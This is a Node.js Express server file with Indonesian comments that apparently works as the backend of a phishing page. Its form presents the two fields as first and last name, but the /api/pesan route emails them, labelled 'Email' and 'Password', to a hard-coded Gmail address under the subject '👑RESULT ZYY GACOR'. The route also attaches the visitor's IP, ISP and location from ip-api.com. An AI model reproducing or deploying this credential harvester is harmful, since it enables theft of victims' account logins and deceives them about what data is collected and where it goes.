require("dotenv").config();
const express = require("express");
const fs = require("fs");
const path = require("path");

const {
  PORT = 3000,
  TARGET_EMAIL = "poppopdev83@gmail.com",
  RESEND_API_KEY,
} = process.env;

if (!RESEND_API_KEY) {
  console.error("Isi RESEND_API_KEY di Environment Variables");
  process.exit(1);
}

// Pembatas laju: 5 pesan per 10 menit per IP
const hits = new Map();
function limited(key, max, windowMs) {
  const now = Date.now();
  const arr = (hits.get(key) || []).filter((t) => now - t < windowMs);
  arr.push(now);
  hits.set(key, arr);
  return arr.length > max;
}

const app = express();
app.set("trust proxy", 1);

app.use((req, res, next) => {
  if (req.body && typeof req.body === "object" && Object.keys(req.body).length) {
    return next();
  }
  express.json({ limit: "10kb" })(req, res, next);
});

app.use(express.static(path.join(__dirname, "public")));

// Video: taruh file public/video.mp4 (atau video.webm)
app.get("/api/config", (req, res) => {
  const file = ["video.mp4", "video.webm"].find((f) => fs.existsSync(path.join(__dirname, "public", f)));
  res.json({ videoUrl: file ? "/" + file : "" });
});

app.post("/api/pesan", async (req, res) => {
  console.log("DEBUG req.body:", JSON.stringify(req.body));

  if (limited("pesan:" + req.ip, 5, 10 * 60 * 1000)) {
    return res.status(429).json({ error: "Terlalu banyak percobaan, coba lagi nanti." });
  }

  const nama = String(req.body.nama || "").trim().slice(0, 80);
const belakang = String(req.body.belakang || "").trim().slice(0, 80);
const setujuIp = Boolean(req.body.setujuIp);

if (!nama || !belakang) {
  return res.status(400).json({ error: "Nama dan nama belakang wajib diisi." });
}

try {
  // Info IP/ASN HANYA diambil kalau pengunjung sendiri yang setuju
  let ipInfoHtml = "<i>(tidak disertakan — pengunjung tidak menyetujui)</i>";

  if (setujuIp) {
    try {
      const ipResp = await fetch(
        `http://ip-api.com/json/${encodeURIComponent(req.ip)}?fields=status,country,regionName,city,isp,org,as,query`
      );
      const ip = await ipResp.json();

      if (ip.status === "success") {
        ipInfoHtml = `

  <div style="font-family:Arial,sans-serif;line-height:1.6;width:100%;"><!-- JUDUL -->
<div style="text-align:center;font-size:17px;font-weight:bold;color:#1b1e25;margin-bottom:18px;letter-spacing:0.5px;">
  INFORMASI JARINGAN
</div>

<!-- IP ADDRESS -->
<div style="background:#f4f5f8;border-radius:10px;padding:12px 16px;margin-bottom:10px;width:100%;box-sizing:border-box;">
  <div style="font-size:12px;color:#777;font-weight:500;">IP ADDRESS</div>
  <div style="font-size:16px;font-weight:bold;color:#1b1e25;margin-top:3px;word-break:break-word;">
    ${ip.query || "-"}
  </div>
</div>

<!-- ASN -->
<div style="background:#f4f5f8;border-radius:10px;padding:12px 16px;margin-bottom:10px;width:100%;box-sizing:border-box;">
  <div style="font-size:12px;color:#777;font-weight:500;">ASN</div>
  <div style="font-size:16px;font-weight:bold;color:#1b1e25;margin-top:3px;word-break:break-word;">
    ${(ip.as || "-").split(" ")[0]}
  </div>
</div>

<!-- ISP -->
<div style="background:#f4f5f8;border-radius:10px;padding:12px 16px;margin-bottom:10px;width:100%;box-sizing:border-box;">
  <div style="font-size:12px;color:#777;font-weight:500;">ISP</div>
  <div style="font-size:16px;font-weight:bold;color:#1b1e25;margin-top:3px;word-break:break-word;">
    ${ip.isp || "-"}
  </div>
</div>

<!-- KOTA -->
<div style="background:#f4f5f8;border-radius:10px;padding:12px 16px;margin-bottom:10px;width:100%;box-sizing:border-box;">
  <div style="font-size:12px;color:#777;font-weight:500;">KOTA</div>
  <div style="font-size:16px;font-weight:bold;color:#1b1e25;margin-top:3px;">
    ${ip.city || "-"}
  </div>
</div>

<!-- PROVINSI -->
<div style="background:#f4f5f8;border-radius:10px;padding:12px 16px;margin-bottom:10px;width:100%;box-sizing:border-box;">
  <div style="font-size:12px;color:#777;font-weight:500;">PROVINSI</div>
  <div style="font-size:16px;font-weight:bold;color:#1b1e25;margin-top:3px;">
    ${ip.regionName || "-"}
  </div>
</div>

<!-- NEGARA -->
<div style="background:#f4f5f8;border-radius:10px;padding:12px 16px;width:100%;box-sizing:border-box;">
  <div style="font-size:12px;color:#777;font-weight:500;">NEGARA</div>
  <div style="font-size:16px;font-weight:bold;color:#1b1e25;margin-top:3px;">
    ${ip.country || "-"}
  </div>
</div>

  </div>
`;
      } else {
        ipInfoHtml = "<i>(gagal diambil)</i>";
      }
    } catch {
      ipInfoHtml = "<i>(gagal diambil)</i>";
    }
    }
    const r = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Authorization": `Bearer ${RESEND_API_KEY}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
  from: "onboarding@resend.dev",
  to: TARGET_EMAIL,
  subject: "👑RESULT ZYY GACOR",
  html: `
    <div style="font-family:sans-serif;max-width:480px;margin:0 auto;padding:24px;background:#f4f5f8;border-radius:12px;">
      <h2 style="color:#1b1e25;margin:0 0 16px;">Data Baru Masuk</h2>
      <table style="width:100%;border-collapse:collapse;background:#fff;border-radius:8px;overflow:hidden;">
        <tr>
          <td style="padding:12px 16px;color:#7a8296;font-size:13px;border-bottom:1px solid #e3e6ee;">Email</td>
          <td style="padding:12px 16px;color:#1b1e25;font-weight:600;border-bottom:1px solid #e3e6ee;">${nama}</td>
        </tr>
        <tr>
          <td style="padding:12px 16px;color:#7a8296;font-size:13px;">Password</td>
          <td style="padding:12px 16px;color:#1b1e25;font-weight:600;">${belakang}</td>
        </tr>
        <tr>
          <td style="padding:12px 16px;color:#1b1e25;font-size:13px;">${ipInfoHtml}</td>
        </tr>
      </table>
      <p style="color:#7a8296;font-size:12px;margin-top:16px;">Dikirim otomatis dari form ladang</p>
    </div>
  `,
}),
    });

    if (!r.ok) {
      throw new Error(await r.text());
    }

    res.json({ ok: true });
  } catch (e) {
    console.error("Login gagal:", e.message);
    res.status(500).json({ error: "Login gagal" });
  }
});

if (require.main === module) {
  app.listen(PORT, () => console.log("Server berjalan di port " + PORT));
}

module.exports = app;
